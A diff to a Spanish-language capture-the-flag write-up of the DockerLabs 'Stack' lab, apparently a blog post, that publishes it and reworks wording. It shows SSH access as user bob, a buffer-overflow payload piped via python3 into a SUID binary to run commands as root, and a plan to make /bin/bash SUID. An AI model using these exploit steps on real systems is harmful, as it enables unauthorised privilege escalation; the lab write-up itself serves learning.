@@ -4,11 +4,10 @@ summary: "Write-up del laboratorio Stack de DockerLabs"
 author: elcybercurioso
 date: 2026-01-11
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, lfi, buffer overflow]
 media_subpath: "/assets/img/posts/dockerlabs_stack"
 image:
   path: main.webp
-published: false
 ---
 
 ## nmap
@@ -107,8 +106,7 @@ Probamos a conectarnos como el usuario `bob` con la contraseña que hemos encont
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
 └─$ ssh bob@172.17.0.2
-bob@172.17.0.2`s password: 
-Linux 7d6ac627e4c6 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64
+bob@172.17.0.2`s password:
 bob@7d6ac627e4c6:~$ whoami
 bob
 bob@7d6ac627e4c6:~$ hostname
@@ -125,7 +123,7 @@ bob:x:1000:1000::/home/bob:/bin/bash
 
 ## escalada de privilegios (root)
 
-En la carpeta `/opt` encontramos un binario cuyos permisos son **SUID** (Permite ejecutar el binario con los permisos del propietario, que en este caso es `root`)
+En la carpeta `/opt` encontramos un binario cuyos permisos son **SUID** (permite ejecutar el binario con los permisos del propietario, que en este caso es `root`)
 
 ```bash
 bob@7d6ac627e4c6:/home$ ls -la /opt
@@ -152,9 +150,9 @@ Escribe la contraseña: <5000 A`s>
 Segmentation fault
 ```
 
-Confirmamos en este punto que estamos tratando con una vulnerabilidad **Buffer Overflow** (vulnerabilidad que permite sobrescribir registros internos de los programas, permitiendo modificar su comportamiento).
+Confirmamos en este punto que estamos tratando con una vulnerabilidad **Buffer Overflow** (vulnerabilidad que consiste en sobrescribir registros internos de los programas, permitiendo modificar su comportamiento).
 
-Ahora indicaremos una cadena de caracteres un poco más corta, y vemos que ahora seguimos corrompiendo el programa, pero en el valor del parámetro `key` nos indica `4141414`, lo que significa que estamos sobrescribiendo el valor de dicha variable, ya que en hexadecimal eso es igual a `AAAA`, o el valor del **registro EIP**:
+Ahora indicaremos una cadena de caracteres un poco más corta, y veremos que ahora seguimos corrompiendo el programa, pero en el valor del parámetro `key` nos indica `4141414`, lo que significa que estamos sobrescribiendo el valor de dicha variable, ya que en hexadecimal eso es igual a `AAAA`, o el valor del registro **EIP** (puntero de instrucción extendido):
 
 ```bash
 bob@7d6ac627e4c6:/home$ /opt/command_exec      
@@ -198,7 +196,15 @@ Ahora sabemos que debemos indicar 76 caracteres antes de indicar `0xdead`, por l
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
 ```
 
-Dado que lo que nos devuelve el comando que ejecutamos con Python no se interpreta correctamente, lo podemos pasar directamente al binario sin tener que imprimirlo por pantalla de la siguiente manera:
+Lo que nos devuelve el comando que ejecutamos con Python no se interpreta correctamente por consola. Sin embargo, se lo podemos pasar directamente al binario sin tener que imprimirlo por pantalla de la siguiente manera:
+
+```bash
+bob@7d6ac627e4c6:/home$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xad\xde\x00\x00\n")' | /opt/command_exec
+Escribe la contraseña: Estás en modo administrador (key = dead)
+Escribe un comando: 
+```
+
+Comprobamos que la explotación del programa se está realizando correctamente. Posteriormente nos piden que indiquemos un comando que queramos ejecutar como un usuario privilegiado, y para que nos lo ejecute, se lo indicaremos de la siguiente manera:
 
 ```bash
 bob@7d6ac627e4c6:/home$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xad\xde\x00\x00\n" + b"whoami")' | /opt/command_exec
@@ -206,7 +212,7 @@ Escribe la contraseña: Estás en modo administrador (key = dead)
 Escribe un comando: root
 ```
 
-Ya que hemos conseguido ejecución de comandos como el usuario `root`, podemos obtener una consola de diferentes maneras, pero en este caso optaremos por cambiar los permisos del binario `/bin/bash` a SUID, el cual de primeras vemos que no lo tiene asignado:
+Ya que hemos conseguido ejecución de comandos como el usuario `root`, podemos obtener una consola de diferentes maneras, pero en este caso optaremos por cambiar los permisos del binario `/bin/bash` para que sea **SUID** (poder ejecutar el binario con los permisos del propietario), el cual de primeras vemos que no lo tiene asignado:
 
 ```bash
 bob@7d6ac627e4c6:/home$ ls -la /bin/bash
